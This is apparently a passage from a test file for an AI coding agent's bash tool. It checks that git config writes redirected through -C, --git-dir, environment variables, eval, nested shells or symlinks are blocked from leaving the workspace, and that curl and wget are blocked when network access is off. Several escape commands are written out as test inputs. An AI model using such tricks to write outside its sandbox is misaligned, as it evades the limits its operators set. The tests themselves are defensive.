        const command = `git --git-dir=${outerTmp.path}/.git config -- user.name --git-dir=${tmp.path}/.git`
        await expect(
          bash.execute(
            { command, description: "Reject config value relocation spoof" },
            { ...ctx, extra: { isolation } },
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        expect(await fs.readFile(path.join(outerTmp.path, ".git", "config"), "utf8")).not.toContain("--git-dir")
      },
    })
  })

  test.each([
    "global",
    "abbreviated-global",
    "abbreviated-file",
    "system",
    "inherited",
    "inline",
    "env",
    "nested-env",
    "nested-concatenation",
    "wrapped-concatenation",
    "quoted-option",
    "eval-concatenation",
    "dynamic-inner",
    "worktree",
  ])("requires interactive admission for unresolved Git config destination: %s", async (mode) => {
    await using outside = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    const target = path.join(outside.path, "owned.cfg")
    const name = ["global", "abbreviated-global"].includes(mode)
      ? "GIT_CONFIG_GLOBAL"
      : mode === "system"
        ? "GIT_CONFIG_SYSTEM"
        : "GIT_CONFIG"
    const inherited = ["global", "abbreviated-global", "system", "inherited"].includes(mode)
    const original = process.env[name]
    if (inherited) process.env[name] = target
    try {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const command =
            mode === "abbreviated-global"
              ? "git config --glob user.email escaped@example.test"
              : mode === "abbreviated-file"
                ? `git config --fi=${shellQuote(target)} user.email escaped@example.test`
                : mode === "global" || mode === "system" || mode === "worktree"
                  ? `git config --${mode} user.email escaped@example.test`
                  : mode === "inline"
                    ? `GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`
                    : mode === "env"
                      ? `env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`
                      : mode === "quoted-option"
                        ? `sh '-''c' ${shellQuote(`env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`)}`
                        : mode === "wrapped-concatenation"
                          ? `env sh -c ${shellQuote(`env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`)}`
                          : mode === "eval-concatenation"
                            ? `eval ${shellQuote(`env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`)}`
                            : mode === "dynamic-inner"
                              ? `sh -c "$(touch ${shellQuote(target)})"`
                              : mode === "nested-concatenation"
                                ? `sh -c ${shellQuote(`env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test`)}`
                                : mode === "nested-env"
                                  ? `sh -c "env GIT_CONFIG=${shellQuote(target)} git config user.email escaped@example.test"`
                                  : "git config user.email escaped@example.test"
          const requests: PermissionRequest[] = []
          const config = path.join(tmp.path, ".git", "config")
          const before = await fs.readFile(config, "utf8")
          await expect(
            bash.execute(
              { command, description: "Require config destination admission" },
              {
                ...ctx,
                ask: async (request) => {
                  requests.push(request)
                  if (
                    request.permission === "external_directory" &&
                    request.metadata?.["requireInteractive"] === true
                  ) {
                    throw new Error("Fixture declined unresolved destination")
                  }
                },
              },
            ),
          ).rejects.toThrow("Fixture declined unresolved destination")
          expect(
            requests.some((request) => request.permission === "external_directory" && request.always.length === 0),
          ).toBe(true)
          expect(await Filesystem.exists(target)).toBe(false)
          expect(await fs.readFile(config, "utf8")).toBe(before)
        },
      })
    } finally {
      if (original === undefined) delete process.env[name]
      else process.env[name] = original
    }
  })

  test("checks plugin-adjusted Git environment before admission and preserves it after approval", async () => {
    await using outside = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const target = path.join(outside.path, "plugin.cfg")
        const trigger = vi.spyOn(Plugin, "trigger").mockImplementation(async (name, _input, output) => {
          if (name === "shell.env" && output && typeof output === "object")
            Object.assign(output, { env: { GIT_CONFIG: target } })
          return output
        })
        const command = "git config user.email approved@example.test"
        let requested = false
        try {
          await expect(
            bash.execute(
              { command, description: "Check plugin environment" },
              {
                ...ctx,
                ask: async (request) => {
                  if (
                    request.permission === "external_directory" &&
                    request.metadata?.["requireInteractive"] === true
                  ) {
                    throw new Error("Fixture declined plugin destination")
                  }
                },
              },
            ),
          ).rejects.toThrow("Fixture declined plugin destination")
          expect(await Filesystem.exists(target)).toBe(false)
          const result = await bash.execute(
            { command, description: "Approve plugin destination" },
            {
              ...ctx,
              ask: async (request) => {
                if (request.permission === "external_directory" && request.metadata?.["requireInteractive"] === true)
                  requested = true
              },
            },
          )
          expect(result.metadata.exit).toBe(0)
          expect(requested).toBe(true)
          expect(await fs.readFile(target, "utf8")).toContain("approved@example.test")
          const requests: PermissionRequest[] = []
          const read = await bash.execute(
            { command: "git config --get user.email", description: "Read inherited config" },
            {
              ...ctx,
              ask: async (request) => {
                requests.push(request)
              },
            },
          )
          expect(read.metadata.exit).toBe(0)
          expect(read.output).toContain("approved@example.test")
          expect(requests.some((request) => request.metadata?.["requireInteractive"] === true)).toBe(false)
        } finally {
          trigger.mockRestore()
        }
      },
    })
  })

  test("requires interactive admission for a gitfile instead of guessing a config path", async () => {
    await using outside = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const target = path.join(outside.path, ".git", "config")
        const before = await fs.readFile(target, "utf8")
        await fs.rm(path.join(tmp.path, ".git"), { recursive: true, force: true })
        await fs.writeFile(path.join(tmp.path, ".git"), `gitdir: ${path.join(outside.path, ".git")}\n`)
        await expect(
          bash.execute(
            { command: "git config user.email escaped@example.test", description: "Check gitfile destination" },
            {
              ...ctx,
              ask: async (request) => {
                if (request.permission === "external_directory" && request.metadata?.["requireInteractive"] === true) {
                  throw new Error("Fixture declined gitfile destination")
                }
              },
            },
          ),
        ).rejects.toThrow("Fixture declined gitfile destination")
        expect(await fs.readFile(target, "utf8")).toBe(before)
      },
    })
  })

  test.each([false, true])("rejects linked Git config writes (missing config: %s)", async (missing) => {
    await using outer = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const target = path.join(outer.path, ".git", "config")
        const original = await fs.readFile(target, "utf8")
        if (missing) await fs.unlink(target)
        await fs.rm(path.join(tmp.path, ".git"), { recursive: true, force: true })
        await fs.symlink(path.join(outer.path, ".git"), path.join(tmp.path, ".git"), "junction")
        const isolation = Isolation.resolve(
          { mode: "workspace-write", network: false, backend: "app" },
          tmp.path,
          tmp.path,
        )
        try {
          await expect(
            bash.execute(
              { command: "git config user.email escaped@example.test", description: "Reject linked config escape" },
              { ...ctx, extra: { isolation } },
            ),
          ).rejects.toThrow(/outside workspace boundary|protected/)
          if (missing) expect(await Filesystem.exists(target)).toBe(false)
          else expect(await fs.readFile(target, "utf8")).toBe(original)
        } finally {
          await fs.unlink(path.join(tmp.path, ".git"))
        }
      },
    })
  })

  test("allows benign git config writes to the default repo config", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // False-positive guard: ordinary `git config user.email` writes the
        // workspace-internal .git/config and must keep working.
        const result = await bash.execute(
          { command: `git config user.email test@example.com`, description: "Set repo email" },
          testCtx,
        )
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test("allows benign git config --file inside the workspace", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // An explicit --file target inside the workspace is a normal,
        // workspace-internal write and must not be denied.
        const result = await bash.execute(
          { command: `git config --file ./custom.cfg user.email test@example.com`, description: "Set custom config" },
          testCtx,
        )
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test("rejects git -C <outside> config benign-key write (silent relocation)", async () => {
    await using outerTmp = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // `git -C <dir>` chdirs before config resolution, so a benign key with
        // no --file writes <dir>/.git/config outside the workspace. The -C
        // value must reach the same boundary checks as an explicit --file.
        await expect(
          bash.execute(
            {
              command: `git -C ${outerTmp.path} config user.email "pwned@example.com"`,
              description: "Attempt relocated git config write outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        // The pre-existing repo config must not have gained the injected value.
        const outsideConfig = await fs.readFile(path.join(outerTmp.path, ".git", "config"), "utf8")
        expect(outsideConfig).not.toContain("pwned@example.com")
      },
    })
  })

  test("rejects git --git-dir=<outside> config benign-key write", async () => {
    await using outerTmp = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // --git-dir replaces the .git directory, so the implicit config target
        // becomes <dir>/config outside the workspace.
        await expect(
          bash.execute(
            {
              command: `git --git-dir=${path.join(outerTmp.path, ".git")} config user.email "pwned@example.com"`,
              description: "Attempt git-dir-relocated git config write outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        const gitDirConfig = await fs.readFile(path.join(outerTmp.path, ".git", "config"), "utf8")
        expect(gitDirConfig).not.toContain("pwned@example.com")
      },
    })
  })

  test("rejects git -C <outside> config --file=<relative> write", async () => {
    await using outerTmp = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // A relative --file target is resolved against the -C directory, so
        // the in-workspace-looking target actually lands outside.
        await expect(
          bash.execute(
            {
              command: `git -C ${outerTmp.path} config --file=rel.cfg user.email "pwned@example.com"`,
              description: "Attempt -C-relocated --file write outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        // The relative target must not have been created outside the workspace.
        await expect(fs.readFile(path.join(outerTmp.path, "rel.cfg"), "utf8")).rejects.toThrow()
      },
    })
  })

  test("allows benign git -C <in-workspace> config writes", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // False-positive guard: a relocated config write that stays inside the
        // workspace is workspace-internal and must keep working.
        await fs.mkdir(path.join(tmp.path, "sub"))
        await execFileAsync("git", ["init", path.join(tmp.path, "sub")])
        const result = await bash.execute(
          { command: `git -C ./sub config user.email test@example.com`, description: "Set sub repo email" },
          testCtx,
        )
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test.each(["-C sub -C ..", "-C sub -C '' -C .."])(
    "allows benign git config writes after folding %s once",
    async (flags) => {
      await using tmp = await tmpdir({ git: true })
      await fs.mkdir(path.join(tmp.path, "sub"))
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
          const result = await bash.execute(
            { command: `git ${flags} config user.email folded@example.com`, description: "Set repo email after chdir" },
            { ...ctx, extra: { isolation } },
          )
          expect(result.metadata.exit).toBe(0)
          expect(await fs.readFile(path.join(tmp.path, ".git", "config"), "utf8")).toContain("folded@example.com")
        },
      })
    },
  )

  test("allows in-workspace barewords that are not paths", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // Regression guard: tightening the relative-path check must not flag
        // harmless barewords/subcommands that resolve inside the workspace.
        const result = await bash.execute({ command: `git status --short`, description: "git status" }, testCtx)
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  test("blocks network-only commands when network is disabled", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        // `curl --version` reaches no path outside the workspace, so the path
        // checks pass — the network guard is what must block it.
        await expect(
          bash.execute({ command: `curl --version`, description: "probe network" }, testCtx),
        ).rejects.toThrow(/Network access is disabled/)
        // Same vector hidden inside `bash -c`.
        await expect(
          bash.execute({ command: `bash -c "wget --version"`, description: "probe network" }, testCtx),
        ).rejects.toThrow(/Network access is disabled/)
      },
    })
  })

  test("allows network-only commands when network is enabled", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: true }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const result = await bash.execute({ command: `curl --version`, description: "curl version" }, testCtx)
        expect(result.metadata.exit).toBe(0)
      },
    })
  })

  describe("path existence pre-validation", () => {
    test("rejects cd to non-existent directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cd /nonexistent/path/that/does/not/exist",
                description: "Change to non-existent dir",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects cat on non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cat nonexistent.txt",
                description: "Cat non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects mv from non-existent file", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "mv nonexistent.txt moved.txt",
                description: "Move non-existent file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("rejects missing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "rm -- -f",
                description: "Remove literal dash-prefixed file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("allows existing literal dash-prefixed rm target after option separator", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "-f")
      await fs.writeFile(filepath, "literal flag filename")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "rm -- -f",
              description: "Remove existing literal dash-prefixed file",
            },
            ctx,
          )

          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(filepath)).toBe(false)
        },
      })
    })

    test("allows ls on existing directory", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `ls ${tmp.path}`,
              description: "List existing directory",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
        },
      })
    })

    test("allows cat on existing file", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: `cat ${filepath}`,
              description: "Cat existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("allows a compound command to create paths before reading them", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: [
                "cat > prompt.txt <<'EOF'",
                "nested model prompt",
                "EOF",
                "cp prompt.txt copied.txt",
                "printf '%s' \"$(cat copied.txt)\"",
              ].join("\n"),
              description: "Create and read a nested prompt",
            },
            ctx,
          )

          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("nested model prompt")
        },
      })
    })

    test("still rejects a read that appears before its creator", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              {
                command: "cat late.txt; touch late.txt",
                description: "Read before creating a file",
              },
              ctx,
            ),
          ).rejects.toThrow(/Path does not exist/)
        },
      })
    })

    test("error message includes hint about Glob tool", async () => {
      await using tmp = await tmpdir()
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          try {
            await bash.execute(
              {
                command: "cat /nonexistent/file.txt",
                description: "Cat non-existent file",
              },
              ctx,
            )
            throw new Error("should have thrown")
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err)
            expect(msg).toContain("Glob")
            expect(msg).toContain("Hint:")
          }
        },
      })
    })

    test("does not treat grep pattern as a path", async () => {
      await using tmp = await tmpdir()
      const filepath = path.join(tmp.path, "existing.txt")
      await fs.writeFile(filepath, "hello\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "grep hello existing.txt",
              description: "Grep existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("hello")
        },
      })
    })

    test("allows mv to a new destination when source exists", async () => {
      await using tmp = await tmpdir()
      await fs.writeFile(path.join(tmp.path, "source.txt"), "hello")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "mv source.txt renamed.txt",
              description: "Rename existing file",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(await Filesystem.exists(path.join(tmp.path, "renamed.txt"))).toBe(true)
        },
      })
    })

    test("resolves relative paths against a preceding top-level cd", async () => {
      await using tmp = await tmpdir()
      await fs.mkdir(path.join(tmp.path, "sub"))
      await fs.writeFile(path.join(tmp.path, "sub", "file.txt"), "nested\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            {
              command: "cd sub && cat file.txt",
              description: "Read a file relative to a cd target",
            },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("nested")
        },
      })
    })

    test("rejects a missing path under a preceding cd target", async () => {
      await using tmp = await tmpdir()
      await fs.mkdir(path.join(tmp.path, "sub"))
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          try {
            await bash.execute(
              {
                command: "cd sub && cat other.txt",
                description: "Read a missing file relative to a cd target",
              },
              ctx,
            )
            throw new Error("should have thrown")
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err)
            expect(msg).toContain("Path does not exist")
            expect(msg).toContain(path.join(tmp.path, "sub", "other.txt"))
          }
        },
      })
    })

    test("ignores cd inside a subshell and resolves against the base directory", async () => {
      await using tmp = await tmpdir()
      await fs.mkdir(path.join(tmp.path, "sub"))
      await fs.writeFile(path.join(tmp.path, "sub", "file.txt"), "nested\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          try {
            await bash.execute(
              {
                command: "(cd sub && cat file.txt)",
                description: "Read a file inside a subshell",
              },
              ctx,
            )
            throw new Error("should have thrown")
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err)
            expect(msg).toContain("Path does not exist")
            expect(msg).toContain(path.join(tmp.path, "file.txt"))
          }
        },
      })
    })
  })
})
